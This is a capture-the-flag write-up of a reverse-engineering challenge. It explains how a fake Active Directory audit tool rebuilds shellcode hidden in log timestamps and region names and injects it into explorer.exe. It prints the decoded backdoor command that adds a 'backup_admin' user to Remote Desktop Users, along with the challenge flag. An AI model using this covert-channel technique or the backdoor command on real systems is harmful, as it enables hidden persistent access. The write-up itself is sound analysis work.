# CorpSyncAudit Writeup

## Challenge

**Category:** Reverse Engineering  
**Event:** Cyber Apocalypse CTF 2026 — The Salt Crown  
**Files:** `CorpSyncAudit.exe`, `logs/` (many sync logs)  
**Flag:** `HTB{d473_71m3_4nd_64ckd00r5}`

## The short version

Damas paid a contractor to hide a backdoor in “required compliance software.” The GUI looks like a boring Active Directory replication auditor. Most of the logs look clean. One log is not clean — it smuggles **shellcode** inside fake timestamps and world regions.

We reverse how the binary turns those log lines into bytes, recover a classic Windows stager, and find a `net user` command whose password is base64 for the flag.

There’s also a live remote that answers `SYNC_TEST` with a always-green health JSON. That’s the cover story, not the flag path.

## Story flavor (why this challenge exists)

The flavor text is basically:

> Compliance is war with better fonts. If you write the audit tool, you decide what “clean” means. A contractor slipped something extra into software everyone was forced to install. The reports came back green. The contractor vanished. Now you’re looking at the leftovers.

What we got:

- A Windows GUI program: `CorpSyncAudit.exe`
- A folder of “replication session” logs

Our job: find what was slipped in.

## What’s in the box

```text
CorpSyncAudit.exe          # PE32+ Windows x64 GUI app (MinGW C++)
logs/
  sync_*.log               # mostly ~1KB “normal” sessions
  sync_20260412_192364.log # ~12KB oddball — this is the interesting one
```

Quick fingerprint:

```bash
$ file CorpSyncAudit.exe
PE32+ executable for MS Windows 5.02 (GUI), x86-64 (stripped)
```

It’s a GUI, not a CLI crackme. It can:

1. Browse and open log files
2. Hit **Test Remote Sync** (TCP client)
3. Quietly do something much worse if the log is the right shape

## First look at the logs

Most logs look like this:

```text
--- START REPLICATION SESSION: LIVE_SYNC ---
[LIVE] NODE=AD-SRV-01 STATUS=ONLINE LATENCY=0.41ms USN=901109
Monday, 04/13/2026 02:01:42 PM UTC | Region=HEADQUARTERS
...
--- END REPLICATION SESSION ---
```

Seven nodes, boring office regions (`HEADQUARTERS`, `BRANCH_OFFICE_A`, …), dates that match the filename. Exactly the kind of thing a compliance officer would skim and rubber-stamp.

Then there’s **`sync_20260412_192364.log`**:

- Much larger (~12KB, ~99 node lines)
- Session header is a weird ISO timestamp, not `LIVE_SYNC`
- Regions like `WORLD`, `SUB_SAHARAN_AFRICA`, `NORTH_AMERICA`, `RUSSIA`
- Dates all over the place (1990s through 2040s)
- Timezones mix `UTC` and `GMT`
- Hours that don’t always make sense with AM/PM

That file screams steganography: **hide data in fields that look like monitoring noise**.

## What the binary is doing (high level)

After looking at imports and decompilation (r2 / Binary Ninja / whatever you like):

**Legitimate-looking stuff**

- Open a log, parse lines, show a “convergence report”
- Remote sync: connect, send `SYNC_TEST\n`, display JSON status
- Pretty UI strings (XOR-obfuscated so `strings` is less helpful)

**Not legitimate**

- Build a buffer of bytes out of certain log lines
- XOR those bytes with a 4-byte key
- Resolve Windows APIs by hash (PEB walk)
- Inject the resulting shellcode into **`explorer.exe`**

So: open the poisoned log → reconstruct malware → inject. We’re not going to run that on a real Windows box for fun; we’re going to **reimplement the decoder offline**.

## String obfuscation (annoying but simple)

App strings aren’t sitting in plaintext in `.rdata`. They’re stored encrypted and unlocked with a tiny XOR:

```text
key = [0x9F, 0x50, 0x66, 0x20]   # repeating
```

Examples after decrypt:

```text
Region=
[LIVE]
SYNC_TEST\n
>> Initiating remote sync test...\r\n
explorer.exe
C:\hyberfile.sys          # typo of hiberfile — used in anti-analysis checks
logs\sync_%04d%02d%02d_%02d%02d%02d.log
Monday / Tuesday / ...
```

Once you know the key, the whole UI story becomes readable.

## The covert channel (this is the real challenge)

### Which lines carry data?

The decoder only cares about lines that contain `Region=` **and** whose region name hashes into a **32-entry table**.

Hash idea (simplified):

1. Start with the usual FNV-ish 64-bit basis
2. Uppercase letters as you go
3. Mix with multiply + rotate
4. Murmur-style finalizer
5. Look up the 64-bit digest in a hardcoded table of 32 values

Benign office names (`HEADQUARTERS`, `BRANCH_OFFICE_A`, …) **do not** hit that table → ignored.

World-style names **do**:

| Index | Region (examples) |
|------:|-------------------|
| 0 | WORLD |
| 1 | NORTH_AMERICA |
| 2 | LATIN_AMERICA |
| 3 | EUROPE |
| 4 | EU_EASTERN |
| … | … |
| 16 | SUB_SAHARAN_AFRICA |
| 21 | RUSSIA |
| 24 | OCEANIA |
| … | 32 total |

The index is only **5 bits** (0–31). Those bits are the control switches for the packing step.

### Turning a timestamp line into 4 bytes

A payload line looks like:

```text
Sunday, 16/09/1997 01:25:34 AM UTC | Region=WORLD
```

Parsed with something like:

```text
%63[^,], %d/%d/%d %d:%d:%d %15s %15s
```

So we get: weekday, day, month, year, hour, minute, second, AM/PM, timezone.

Then the packing (conceptually):

1. Take the 5-bit region index as a bit string (MSB first).
2. If timezone is **`GMT`**, do a weird shuffle of hour/min/sec first  
   (if it’s `UTC`, leave them alone).
3. For each of hour, min, sec, day, month: if the matching region bit is set,  
   XOR that field with a fixed “mid” value:
   - hour ⊕ `0x0C` (12)
   - min  ⊕ `0x1E` (30)
   - sec  ⊕ `0x1E` (30)
   - day  ⊕ `0x10` (16)
   - month ⊕ `0x06` (6)
4. Pack into a 32-bit integer:

```text
bits:
  hour   << 27   (5 bits)
  min    << 21   (6 bits)
  sec    << 15   (6 bits)
  day    << 10   (5 bits)
  month  << 6    (4 bits-ish)
  (year - 1990)  (low bits)
```

5. XOR **every** byte of that dword with the weekday number  
   (Monday=1 … Sunday=7).

Each matching line → **exactly 4 payload bytes**.

~99 matching lines in the big log → **396 bytes** of ciphertext-ish payload.

### The 4-byte session key

Those 4-byte chunks are then XOR’d again with a fixed session key, applied as big-endian bytes repeating:

```text
key dword = 0xF07EC6A4
key bytes = F0 7E C6 A4
```

In the binary this key is also the salt for “hash → API name” resolution used by the inject path. Under the intended environment checks it falls out as this constant; we can also just **try** it because the result is unmistakable:

After XOR you get the classic x64 Windows shellcode prologue:

```text
fc 48 83 e4 f0 e8 ...
cld
and rsp, -0x10
call ...
; PEB walk, resolve APIs, ...
```

If you see `fc 48 83 e4 f0`, you know the channel decode is right.

## What’s inside the shellcode

It’s a standard “resolve APIs and WinExec a command” style stub. The command string sitting in the blob is:

```text
net user backup_admin SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ== /add &&
net localgroup "Remote Desktop Users" backup_admin /add
```

So the backdoor, if it ever ran for real, would:

1. Create a local admin-ish user `backup_admin`
2. Set the password to that long base64 string
3. Drop the account into **Remote Desktop Users**

For a CTF, we don’t need the account. We just base64-decode the password:

```bash
$ echo 'SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ==' | base64 -d
HTB{d473_71m3_4nd_64ckd00r5}
```

Flag, done.

(The leetspeak is literally “data time and backdoors” — cute.)

## The remote server (optional side quest)

The binary’s **Test Remote Sync** button:

1. `WSAStartup`
2. TCP connect to **`127.0.0.1:4445`** (hardcoded)
3. Send **`SYNC_TEST\n`**
4. Read a JSON blob and pretty-print it in the UI

On an HTB spawned instance, that service is just remapped to something like:

```text
154.57.164.79:31970
```

You can talk to it without the GUI:

```bash
python3 remote_client.py 154.57.164.79:31970
# or
printf 'SYNC_TEST\n' | nc 154.57.164.79 31970
```

You get something like:

```json
{
  "timestamp": "...",
  "controller": "CORP-DC-CTRL-01",
  "overall": "HEALTHY",
  "nodes": [
    {"node": "AD-SRV-01", "status": "ONLINE", "region": "HEADQUARTERS", ...},
    ...
  ]
}
```

Always healthy. Only office regions. No flag on the wire.  
That’s the joke of the scenario: **the live audit always says everything is fine.**

Anything other than an exact `SYNC_TEST` style message gets silence.

## How to solve it yourself (checklist)

1. **Triage** the PE: GUI, sockets, file open, GDI — looks like an audit tool.
2. **Diff the logs**: find the one huge weird file.
3. **Decrypt strings** (XOR `9F 50 66 20`) so the UI and formats make sense.
4. **Find the log parser** that looks for `Region=` and a 32-entry hash table.
5. **Recover the packer**: datetime + region bits → 4 bytes + weekday XOR.
6. **XOR with `0xF07EC6A4`** → shellcode.
7. **`strings` the shellcode** → `net user ... <base64> ...`
8. **Base64-decode** the password → flag.
9. (Optional) Poke the remote with `SYNC_TEST` and enjoy the fake clean bill of health.

A minimal solver lives in `solve.py` next to this writeup:

```bash
python3 solve.py
# HTB{d473_71m3_4nd_64ckd00r5}
```

## Why this is a cool (and slightly evil) design

- The **carrier** is something auditors are trained to ignore: latency/USN noise and geography tags.
- The **decoder is the product** itself — open the log in the “official” tool and the implant rebuilds.
- The **remote** reinforces the lie: live sync always returns HEALTHY.
- The **payload** is realistic (account + RDP group), not a toy `printf`.

You don’t need to successfully inject into `explorer.exe` to win. Understanding the codec is enough.

## Flag

```text
HTB{d473_71m3_4nd_64ckd00r5}
```

## Files from the solve

| File | What it is |
|------|------------|
| `solve.py` | Offline decoder: stego log → shellcode → flag |
| `remote_client.py` | Speaks `SYNC_TEST` to the spawned instance |
| `shellcode.bin` | 396-byte reconstructed stager |
| `flag.txt` | The flag |

---

*Compliance said the environment was healthy. The timestamps said otherwise.*
